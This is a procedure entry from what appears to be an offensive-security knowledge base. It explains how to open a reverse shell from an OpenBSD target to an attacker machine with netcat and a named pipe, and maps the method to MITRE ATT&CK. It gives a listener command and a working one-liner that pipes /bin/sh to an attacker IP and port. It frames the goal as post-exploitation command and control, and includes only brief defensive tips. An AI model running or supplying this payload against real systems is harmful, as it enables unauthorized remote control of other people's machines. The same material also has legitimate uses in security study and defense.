---
id: 9410165f-fe9f-438a-9c24-173d9d40993c
name: Establish-Reverse-Shell-with-Netcat-on-OpenBSD
type: procedure
description: >-
  This procedure demonstrates how to establish a reverse shell from an OpenBSD
  target to an attacker machine using Netcat and a named pipe technique,
  bypassing limitations in OpenBSD's Netcat implementation.
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.387458+00:00'
updated_at: '2023-04-10T20:25:30.180775+00:00'
tactics:
  - '[[Execution]]'
  - '[[Command and Control]]'
techniques:
  - '[[Unix Shell]]'
  - '[[Standard Non-Application Layer Protocol]]'
sub_techniques: []
tags:
  - reverse-shell
  - netcat
  - openbsd
  - post-exploitation
  - command-and-control
commands:
  - '[[commands/netcat-listen-for-reverse-shell]]'
platforms:
  - OpenBSD
  - Unix
tools:
  - '[[tools/Netcat]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Establish-Reverse-Shell-with-Netcat-on-OpenBSD

## Summary

This procedure outlines the steps to create a reverse shell connection from an OpenBSD target system to an attacker-controlled machine using Netcat (nc). It employs a named pipe technique to handle input/output redirection, as OpenBSD's Netcat lacks the -e option for direct shell execution. This is useful in post-exploitation scenarios to gain interactive command execution on the target while bypassing firewall restrictions that block inbound connections.

## Description

A reverse shell allows the target machine to initiate a connection back to the attacker, enabling remote command execution. On OpenBSD, Netcat is a standard utility but does not support executing a program over the connection (no -e flag), so a FIFO (named pipe) in /tmp is used to bridge the shell's stdin/stdout/stderr to the Netcat stream. The attacker first sets up a listener, and the target runs the payload to connect back. This technique maps to MITRE ATT&CK Execution (TA0002) via Unix Shell (T1059.004) and Command and Control (TA0011) via Non-Application Layer Protocol (T1095). It requires shell access on the target to execute the payload and network connectivity to the attacker's IP/port.

## Requirements

1. Netcat installed on both attacker and target machines (built-in on OpenBSD).
2. Network access from target to attacker IP on the specified port (e.g., no firewall blocking outbound TCP to port 4242).
3. Shell access on the target to execute the payload (e.g., via initial RCE or compromised account).
4. Attacker machine with a public or reachable IP address.

## Defense

- Monitor outbound network connections to unusual IPs/ports using tools like firewall logs or IDS (e.g., Snort rules for nc traffic).
- Restrict creation of named pipes in /tmp via AppArmor/SELinux or filesystem permissions.
- Enable process auditing to detect suspicious bash one-liners or nc executions.
- Use endpoint detection agents to flag reverse shell patterns, such as unexpected TCP connections from shells.

## Objectives

1. Establish an interactive shell session from the target to the attacker machine.
2. Enable remote command execution for post-exploitation activities like file transfer or persistence.
3. Maintain command and control over the compromised OpenBSD system.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Start a Netcat listener on the attacker side to accept the incoming reverse shell connection. This opens a TCP port for the target to connect to, providing a bind-like interface without exposing services on the target.

**Command** ([[commands/netcat-listen-for-reverse-shell]]):
```bash
nc -l 4242
```

> This command listens on port 4242. Replace 4242 with your chosen port if needed. Expected output is a blank prompt waiting for connection. Why: Ensures the attacker is ready to receive the shell before the target executes the payload, preventing connection failures.

### Step 2: Execute Reverse Shell Payload on Target

**Context**: On the OpenBSD target, run the bash one-liner to create a named pipe, spawn an interactive shell (/bin/sh), and pipe I/O through Netcat to the attacker. This step assumes you have command execution capability (e.g., via webshell or SSH).

**Code** ([[codes/OpenBSD-Netcat-Reverse-Shell-via-Named-Pipe]]):
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

> Substitute 10.0.0.1 with the attacker's IP and 4242 with the listener port. Expected output on target: No visible output if successful; the shell interacts via the attacker's terminal. On attacker: Incoming connection with a shell prompt (e.g., $ or # depending on privileges). Why: The named pipe (/tmp/f) handles bidirectional communication since nc can't exec the shell directly. Verify by typing commands like 'whoami' or 'id' on the attacker side.

### Step 3: Verify and Interact with the Shell

**Context**: Confirm the reverse shell is active and stable. Test basic commands to ensure full interactivity.

**Instructions**: On the attacker machine, once connected, run simple commands:
- `whoami` to check user context.
- `pwd` to verify current directory.
- `ps aux | grep nc` to check for the process on target (if needed).

> Expected output: Responses from the target system, indicating control. If the connection drops, re-run the payload. Why: Validates the shell's functionality and privileges before proceeding to further exploitation.
